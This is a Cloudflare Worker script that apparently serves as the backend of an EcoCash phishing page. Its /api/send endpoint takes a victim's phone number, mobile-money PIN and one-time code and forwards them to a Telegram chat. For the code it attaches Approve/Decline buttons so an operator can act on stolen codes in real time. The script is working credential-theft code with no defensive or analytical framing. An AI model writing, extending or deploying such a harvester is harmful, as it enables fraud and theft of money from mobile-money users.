export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // 1. Handle the Telegram API request
    if (url.pathname === '/api/send' && request.method === 'POST') {
      try {
        const requestData = await request.json();
        const { phone, pin, amount, currency, txnId, code } = requestData;

        const botToken = env.TELEGRAM_BOT_TOKEN;
        const chatId = env.TELEGRAM_CHAT_ID;

        if (!botToken || !chatId) {
          return new Response(JSON.stringify({ error: "Secrets not configured" }), { status: 500 });
        }

        let message = `🔐 *New EcoCash Activity*\n-------------------------------\n`;
        if (phone) message += `📱 *Phone:* +263 ${phone}\n`;
        if (pin) message += `🔑 *PIN:* ${pin}\n`;
        if (code) message += `🔢 *Code:* ${code}\n`;
        message += `💰 *Amount:* ${currency} ${amount}\n🆔 *Txn ID:* ${txnId}\n⏱ *Time:* ${new Date().toLocaleString()}`;

        const payload = { chat_id: chatId, text: message, parse_mode: 'Markdown' };
        
        if (code) {
          payload.reply_markup = {
            inline_keyboard: [[
              { text: "✅ Approve", callback_data: "approve" },
              { text: "❌ Decline", callback_data: "decline" },
              { text: "😅 Oops", callback_data: "oops" }
            ]]
          };
        }

        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });
        
        const tgData = await tgRes.json();
        
        if (!tgData.ok) {
          return new Response(JSON.stringify({ error: tgData.description }), { status: 400 });
        }
        
        return new Response(JSON.stringify({ success: true }), { status: 200 });

      } catch (e) {
        return new Response(JSON.stringify({ error: e.message }), { status: 500 });
      }
    }

    // 2. Serve the static files for everything else
    return env.ASSETS.fetch(request);
  }
};
